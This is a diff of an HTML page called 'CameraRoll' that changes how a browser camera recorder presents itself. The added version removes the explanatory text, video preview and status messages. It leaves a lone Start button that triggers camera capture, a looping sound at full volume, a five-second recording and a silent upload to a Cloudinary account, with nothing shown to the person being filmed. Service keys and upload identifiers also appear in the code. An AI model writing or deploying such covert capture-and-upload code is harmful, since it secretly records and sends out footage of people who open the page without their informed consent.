@@ -3,80 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CameraRoll</title>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <title>CameraRoll</title>
 
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 30px;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
         }
 
-        video {
-            width: min(90vw, 640px);
-            max-height: 480px;
-            background: #111;
-            border-radius: 10px;
-        }
-
-        button {
-            padding: 12px 24px;
-            font-size: 18px;
+        #startButton {
+            padding: 14px 28px;
+            font-size: 20px;
             cursor: pointer;
-            margin: 10px;
-        }
-
-        #status {
-            margin: 20px;
-            font-weight: bold;
         }
     </style>
 </head>
 
 <body>
 
-<h1>CameraRoll</h1>
-
-<p>
-    Press Start to give the browser permission to use your camera.
-</p>
-
 <button id="startButton">Start</button>
-
-<br>
-
-<video id="preview" autoplay muted playsinline></video>
-
-<p id="status">Waiting...</p>
 
 <audio id="customSound" src="sound.mp3" preload="auto" loop></audio>
 
 <script>
-    const SUPABASE_URL = "https://vtonphofloujvarqovtd.supabase.co";
-
-    const SUPABASE_KEY =
-        "sb_publishable_5bOn3-dkC3b91OifBQHOZQ_1bNB6UmY";
-
-    const supabaseClient = supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_KEY
-    );
-
-    const BUCKET_NAME = "camera-recordings";
+    const CLOUD_NAME = "hwr3zkhl";
+    const UPLOAD_PRESET = "camera_upload";
 
     const RECORDING_TIME = 5000;
 
-    const video = document.getElementById("preview");
     const startButton = document.getElementById("startButton");
-    const statusText = document.getElementById("status");
     const customSound = document.getElementById("customSound");
 
     startButton.addEventListener("click", async () => {
 
         startButton.disabled = true;
-        statusText.textContent = "Requesting camera permission...";
 
         let stream;
 
@@ -86,27 +51,22 @@
                 audio: false
             });
         } catch (error) {
-            console.error(error);
-
-            statusText.textContent =
-                "Camera permission was denied or unavailable.";
-
+            console.error("Camera permission/error:", error);
             startButton.disabled = false;
             return;
         }
 
-        video.srcObject = stream;
-
         /*
-         * The browser requires user interaction before audio playback,
-         * which is why this happens from the Start button.
+         * Start the looping sound.
+         * Browser volume maximum = 100%.
          */
+        customSound.volume = 1.0;
+        customSound.currentTime = 0;
+
         try {
-            customSound.volume = 1.0;
-            customSound.currentTime = 0;
             await customSound.play();
         } catch (error) {
-            console.log("Audio playback blocked:", error);
+            console.error("Audio playback blocked:", error);
         }
 
         let mimeType = "";
@@ -119,9 +79,10 @@
             mimeType = "video/webm";
         }
 
-        const options = mimeType ? { mimeType } : {};
-
-        const recorder = new MediaRecorder(stream, options);
+        const recorder = new MediaRecorder(
+            stream,
+            mimeType ? { mimeType } : {}
+        );
 
         const chunks = [];
 
@@ -131,64 +92,21 @@
             }
         };
 
-        recorder.onstart = () => {
-            statusText.textContent = "Recording for 5 seconds...";
-        };
-
         recorder.onstop = async () => {
-
-            statusText.textContent = "Preparing upload...";
 
             const actualType =
                 recorder.mimeType || "video/webm";
-
-            const extension =
-                actualType.includes("mp4") ? "mp4" : "webm";
 
             const blob = new Blob(chunks, {
                 type: actualType
             });
 
-            const filename =
-                `recording-${Date.now()}.${extension}`;
-
-            const filePath =
-                `recordings/${filename}`;
-
             /*
-             * Upload the recording to Supabase Storage.
-             */
-            const { data, error } =
-                await supabaseClient
-                    .storage
-                    .from(BUCKET_NAME)
-                    .upload(filePath, blob, {
-                        contentType: actualType,
-                        upsert: false
-                    });
-
-            if (error) {
-                console.error("Upload failed:", error);
-
-                statusText.textContent =
-                    "Recording finished, but upload failed.";
-
-            } else {
-
-                console.log("Uploaded:", data);
-
-                statusText.textContent =
-                    "Recording uploaded successfully.";
-            }
-
-            /*
-             * Stop camera.
+             * Stop camera immediately after recording.
              */
             stream.getTracks().forEach(track => {
                 track.stop();
             });
-
-            video.srcObject = null;
 
             /*
              * Stop sound.
@@ -196,17 +114,50 @@
             customSound.pause();
             customSound.currentTime = 0;
 
+            /*
+             * Upload to Cloudinary.
+             */
+            const formData = new FormData();
+
+            formData.append("file", blob, "camera-recording.webm");
+            formData.append("upload_preset", UPLOAD_PRESET);
+
+            try {
+                const response = await fetch(
+                    `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`,
+                    {
+                        method: "POST",
+                        body: formData
+                    }
+                );
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    console.error("Cloudinary upload failed:", result);
+                } else {
+                    console.log("Uploaded:", result.secure_url);
+                }
+
+            } catch (error) {
+                console.error("Upload error:", error);
+            }
+
             startButton.disabled = false;
         };
 
+        /*
+         * Begin recording.
+         */
         recorder.start();
 
+        /*
+         * Automatically stop after 5 seconds.
+         */
         setTimeout(() => {
-
             if (recorder.state === "recording") {
                 recorder.stop();
             }
-
         }, RECORDING_TIME);
     });
 </script>
